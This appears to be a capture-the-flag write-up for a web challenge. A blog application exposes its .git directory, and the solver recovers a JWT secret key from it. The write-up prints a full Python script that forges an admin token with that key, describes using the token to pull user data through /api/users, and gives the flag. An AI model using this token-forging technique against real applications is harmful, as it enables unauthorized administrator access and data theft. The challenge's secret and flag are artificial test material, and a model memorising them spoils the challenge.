# About
Hey!! We have a small problem... We deployed a blog application for N0PStopians, and we got hacked by WebTopia! Can you find how they did this?

## Hints
Don't push me too hard.
Nevermind it's fine, I was just pulling your leg :)

# Solve

I finally put the hints together and realized it was all about git. The .git directory is public. We can download and dump the .git directory to find the JWT_SECRET_KEY

![](Images/Pasted%20image%2020250601160108.png)

We can quickly forge a new admin token with the following python script

```
import jwt
import time
import uuid

secret_key = "6e29664d48f684ce84a858c7e10c39f588f7ff44151d8e7db59ce6d2e189436172963420fe277a5d591736db6e8ac7b28c7dcfec7933a78877f9684ed1a9513af320e8177e2607512959f38b480249e49a27debef9f0cc8c8d24fec534a48ce62a21509a9ebc812580faebbd48190875d5bc7cd64a7a955790c9dd73a375ea1a55f7033ed0331560c3d824c9c669fe850cad4208477dd0894dcc7d5b42cc7de2fab882ce2189571fd456520d1e29a132acb9f21ba2ddf12e2ae5f41c91f5aca7925c5e1d04c6cdd9c03557203b9b1cabcf7c962b7d8a602fac0e4fd61c2794498d8a7f331b299bd90cf397a809208c18d6b48f0c19949c38feaaa5ca542cdc79"

now = int(time.time())

payload = {
    "fresh": False,
    "iat": now,
    "jti": str(uuid.uuid4()),
    "type": "access",  # <--- fix here
    "sub": "cfea660f-1d93-475c-9272-20aaba055e98",
    "nbf": now,
    "csrf": str(uuid.uuid4()),
    "exp": now + 900,  # expires in 15 minutes
    "username": "admin"
}

token = jwt.encode(payload, secret_key, algorithm="HS256")
print(token)
```

Using our new token we can find all users and their posts from the /api/users call.

Then more specifically search posts based on the user public id to get the flag.

![](Images/Pasted%20image%2020250601160219.png)

```
N0PS{d0t_G17_1n_Pr0DuC710n?!!}
```